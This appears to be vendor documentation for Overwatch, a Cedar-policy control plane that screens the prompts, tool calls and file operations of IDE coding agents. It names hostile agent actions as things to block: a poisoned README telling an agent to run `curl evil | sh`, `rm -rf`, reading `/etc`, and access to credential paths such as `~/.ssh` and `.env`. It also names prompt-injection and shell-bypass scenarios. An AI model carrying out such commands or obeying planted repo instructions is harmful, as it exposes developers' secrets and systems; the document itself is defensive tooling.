# Overwatch policies, mapped to what they protect

**Overwatch is the policy control plane for IDE coding agents** (Cursor, Claude Code,
GitHub Copilot). It sits on the IDE hook path, runs Highflame's detectors on every
prompt, tool call, and file operation, and evaluates the result against Cedar policies to
allow, block, redact, or escalate the action **before it leaves the developer's machine.**

Why it matters, in one line: enterprises want to roll out coding agents to thousands of
developers, but security and compliance need controls in place first. Each Overwatch
policy category supplies one of those controls. This page lists every policy and ties it
to the use case it serves, who owns it, and the compliance framework it supports, so you
can enable the pack that matches your mandate instead of reasoning about 47 individual
rules.

> **Where the policies live.** Every policy below ships with the platform and is enabled
> per tenant from **Studio → Overwatch → Policies**. This page is the catalog of what each
> policy protects and the use case it serves; enforcement runs inside the platform. For
> the narrative, concepts, and a setup walkthrough, see
> **[docs.highflame.ai](https://docs.highflame.ai)**.

---

## How enforcement works

```
Developer / Agent  →  IDE hook  →  Highflame detectors  →  Cedar policy  →  allow / block / redact / step-up
   (Cursor,            (prompt,      (secrets, PII,          (Overwatch
    Claude Code,        tool call,    injection, content      policy set)
    Copilot)            file op)      safety, bash AST…)
```

Cedar is **default-deny**, so a permit-baseline is always loaded and threat-specific
`forbid` rules override it when a detector fires. The detectors produce context keys
(`secrets_detected`, `pii_types`, `injection_score`, `tool_operation_classes`, …) and the
policies are simply assertions over those keys. That separation is why you can re-tune a
threshold or scope a rule to one agent without touching detection code.

| Cedar action | Cursor hook | Claude Code hook |
| --- | --- | --- |
| `process_prompt` | `beforeSubmitPrompt` | `UserPromptSubmit` |
| `call_tool` | `beforeShellExecution`, `beforeMCPExecution` | `PreToolUse` (Bash, MCP) |
| `read_file` | `beforeReadFile`, `beforeTabFileRead` | `PreToolUse` (Read) |
| `write_file` | (write via MCP) | `PreToolUse` (Write/Edit) |
| `connect_server` | (MCP connect) | (MCP connect) |

---

## The six categories at a glance

| Category | Who it's for | What it prevents | Compliance support |
| --- | --- | --- | --- |
| **Secrets Detection** | CISO / AppSec | An agent leaking cloud keys to a third-party model | NIST SC-28/IA-5, OWASP LLM06/07, PCI 3.4 |
| **PII Detection** | DPO / Privacy / Compliance | Customer PII reaching a model provider's logs | GDPR Art. 32, HIPAA §164.312, PCI DSS, CCPA |
| **Semantic Threat Detection** | AppSec / AI Security | A poisoned repo file making an agent run malicious commands | OWASP LLM01/02, ASI01/02, MITRE ATLAS T0051/54 |
| **Content Safety** | Trust & Safety / Legal / AI governance | Agent output that violates acceptable use | EU AI Act Art. 52, ISO 42001, NIST SI-4 |
| **Tool Permissioning** | Platform / DevEx + Security | An autonomous agent running `rm -rf`, reading `/etc`, or exfiltrating via `curl` | NIST CM-7/AC-6, OWASP ASI02 + MCP01-05, MITRE T1059 |
| **Agent-Specific Guardrail** | Platform teams running multiple agents | One policy failing to fit agents with different risk profiles | Per-agent governance, BYO-agent control |

A seventh group, **Organization**, is not a threat category. It is the deployment posture
(permit-default vs deny-default, project-scoped access, audit trail) and is covered at the
end.

---

## Full policy inventory

**14 policy bundles, 47 Cedar rules.** Severity is the bundle's headline severity; rule
counts are the individual `forbid`/`permit` statements inside each bundle.

### Default bundles

| Policy | Category | Rules | Severity |
| --- | --- | --- | --- |
| Baseline permit | Organization | 1 | low |
| Secrets Detection | Secrets Detection | 7 | critical |
| PII Detection | PII Detection | 8 | critical |
| Semantic Threat Detection | Semantic Threat | 8 | critical |
| Content Safety | Content Safety | 6 | critical |
| Tool Permissioning defaults | Tool Permissioning | 2 | high |

### Optional templates

| Policy | Category | Rules | Severity |
| --- | --- | --- | --- |
| Block shell / command execution | Tool Permissioning | 1 | critical |
| Bash operation-class control (step-up) | Tool Permissioning | 3 | high |
| MCP server allowlist | Tool Permissioning | 2 | medium |
| MCP tool permissions | Tool Permissioning | 3 | critical |
| Agent-specific guardrails | Agent-Specific Guardrail | 2 | critical |
| Default deny-all baseline | Organization | 1 | high |
| Audit all actions | Organization | 1 | low |
| Project-based permissions (ReBAC) | Organization | 2 | medium |

---

## The use-case packs

Group the 14 bundles into **five packs** plus a secure-by-default baseline. Each pack maps
to one owner, one mandate, and one compliance framework, so enabling protection is a
single decision rather than forty-seven.

### Pack 0 — Secure-by-default baseline

| | |
| --- | --- |
| **Bundles** | Baseline permit + Secrets + Semantic + Tool defaults |
| **Who it's for** | CISO / AppSec (the team that owns the agent rollout) |
| **What it stops** | Dev pastes a live `AKIA…` key into a prompt; agent reads `.env` or `~/.ssh/id_rsa`; a poisoned README tells the agent to run `curl evil \| sh`; agent tries `rm -rf` or reads `/etc` |
| **Value** | Removes the top three reasons security blocks an agent rollout (credential leak, injection, destructive ops) with low false positives |
| **Compliance** | NIST SC-28/IA-5/SI-3, OWASP LLM01/06, MITRE T1059/T1552 |

Start here: it makes the agent safe out of the box and clears the biggest objections with
minimal tuning.

### Pack 1 — Privacy & Regulated Data

| | |
| --- | --- |
| **Bundle** | PII Detection |
| **Who it's for** | DPO / Privacy / Compliance in regulated industries (fintech, health, gov) |
| **What it stops** | Support engineer pastes a customer record (SSN, credit card); agent reads a PII-laden CSV into a prompt |
| **Value** | Unlocks agents for regulated teams. Severity tiering is tuned so it does not break normal dev work: SSN/CC/passport/IBAN block all surfaces, email/phone/DOB block prompt and tool only, IP is prompt-only |
| **Compliance** | GDPR Art. 32, HIPAA §164.312, PCI DSS 3.4/4.1, CCPA §1798.150 |

### Pack 2 — AI Governance & Acceptable Use

| | |
| --- | --- |
| **Bundle** | Content Safety |
| **Who it's for** | Trust & Safety / Legal / the AI-governance owner |
| **What it stops** | Agent generates or is steered toward violent, weapons, hate, crime, sexual, or heavily profane content |
| **Value** | Acceptable-use and brand/legal protection. Thresholds are tuned (hate 75, profanity 90) so normal expression is fine |
| **Compliance** | EU AI Act Art. 52, ISO 42001, NIST SI-4. The procurement requirement for EU enterprises |

### Pack 3 — Zero-Trust Tooling

| | |
| --- | --- |
| **Bundles** | Bash operation-class control (or full shell block) + MCP server allowlist + MCP tool permissions + deny-all baseline + project-based permissions |
| **Who it's for** | Platform / DevEx + Security in high-security or regulated environments |
| **What it stops** | Agent replays an MCP-blocked operation through the shell; connects an unverified MCP server; reaches the network via `curl`; runs an unrecognized CLI |
| **Value** | Least-privilege for autonomous agents. The **bash AST classifier** tiers every shell command (read-only allowed, network blocked, writes blocked, execute/unknown routed to **human step-up approval via OpenID CIBA**). That turns a binary block into human-in-the-loop, which is what lets an enterprise grant agents real autonomy. The MCP allowlist plus unverified-server block is supply-chain control for the fast-growing MCP ecosystem |
| **Compliance** | NIST CM-7/AC-6(1), OWASP ASI02 + MCP01-05, MITRE T1059 |

Step-up approval is the capability most teams find decisive: deny the dangerous thing, or
let a named approver wave it through, instead of blocking the developer cold.

### Pack 4 — Audit & Compliance

| | |
| --- | --- |
| **Bundle** | Audit all actions |
| **Who it's for** | GRC / the team preparing for an audit |
| **What it serves** | Every agent action permitted and logged for an evidence trail |
| **Value** | SOC2 evidence with no enforcement risk; pairs with any other pack |
| **Compliance** | SOC2 |

### Overlay — Per-agent guardrails

| | |
| --- | --- |
| **Bundle** | Agent-specific guardrails |
| **Who it's for** | Platform teams running more than one agent |
| **What it serves** | Injection-block scoped to Claude, PII-block scoped to Cursor; stricter rules on the more autonomous agent |
| **Value** | Principal-scoped control. One platform governs heterogeneous tools and BYO-agents. Foundation for per-agent risk scoring |

---

## Recommended rollout

1. **Start with the secure-by-default baseline** (Pack 0): Secrets, Semantic, and Tool
   defaults. Low false positives, universal value, and they remove the top three reasons
   security blocks an agent rollout.
2. **Add packs by mandate.** Turn on Privacy, AI Governance, Zero-Trust Tooling, or Audit
   based on the frameworks you already have to satisfy.
3. **Layer per-agent overlays** if you run more than one agent.

Each step maps to a compliance framework you already report against, so every control you
add has an owner and an audit story.

---

## Compliance coverage matrix

| Framework | Covered by |
| --- | --- |
| OWASP LLM Top 10 (LLM01, LLM02, LLM06, LLM07) | Semantic, Secrets |
| OWASP Agentic Top 10 (ASI01, ASI02) | Semantic, Tool Permissioning |
| OWASP MCP Top 10 (MCP01-05) | MCP allowlist + tool permissions |
| MITRE ATLAS (AML.T0051, T0054) | Semantic (injection, jailbreak) |
| MITRE ATT&CK (T1059, T1005, T1552) | Semantic, Tool Permissioning, Secrets |
| NIST 800-53 (AC-3/6, CM-7, IA-5, SC-28, SI-3/4) | Secrets, Tool Permissioning, Content Safety |
| PCI DSS 3.4 / 4.1 | PII, Secrets |
| GDPR Art. 32 | PII |
| HIPAA §164.312 | PII |
| EU AI Act Art. 52 / ISO 42001 | Content Safety |
| SOC2 | Audit (Organization) |

---

## Appendix: rule-level detail

**Secrets Detection (7):** secrets-in-prompt, secrets-in-tool, SSH keys, PEM/cert keys,
env-var secrets, credential-path access (`~/.ssh`, `~/.aws`, `~/.gnupg`, gcloud, azure,
`id_rsa`), `.env` file access.

**PII Detection (8, severity-tiered):** SSN + credit card (critical, all four surfaces),
passport + IBAN (high, all surfaces), email + phone + DOB (medium, prompt and tool only),
IP address (low, prompt only).

**Semantic Threat (8, two tiers):** pattern tier with no API dependency (command injection
in tool and prompt, SQL injection in tool and prompt, path traversal, encoded payloads);
ML tier (`injection_score >= 75`, `jailbreak_score >= 75`). The offline pattern tier
matters for air-gapped environments.

**Content Safety (6, ML scores 0-100):** violence >= 80, weapons >= 80, hate speech >= 75,
crime >= 80, sexual >= 80, profanity >= 90.

**Tool Permissioning (11 across 5 bundles):** sensitive system paths (`/etc`, `/proc`,
`/System`, …) and destructive MCP ops (`fs.delete`, `rmdir`, `unlink`); full shell block;
bash AST operation classes (block network, block writes, step-up for execute/unknown);
MCP server allowlist; MCP tool permissions (permit-default + exclude untrusted + block
unverified-registry servers).

**Agent-Specific Guardrail (2):** injection-block on the Claude agent, PII-block on the
Cursor agent (customizable per deployment).

**Organization / posture (5):** baseline permit, deny-all baseline, audit-all,
dev-project full access + support-project read-only (project-based / ReBAC).

### What a policy looks like

Block any tool call that carries a detected secret:

```cedar
forbid (
    principal,
    action == Overwatch::Action::"call_tool",
    resource
)
when {
    context has secrets_detected && context.secrets_detected == true
};
```

Route risky shell commands to human approval instead of a hard block:

```cedar
@step_up_required("role=security_oncall,timeout_seconds=3600")
permit (
    principal,
    action == Overwatch::Action::"call_tool",
    resource
)
when {
    context has tool_operation_classes &&
    (
        context.tool_operation_classes.contains("execute_enabling") ||
        context.tool_operation_classes.contains("unknown")
    )
};
```

Every rule above ships with the platform. Enable and tune them per tenant in
**Studio → Overwatch → Policies**.
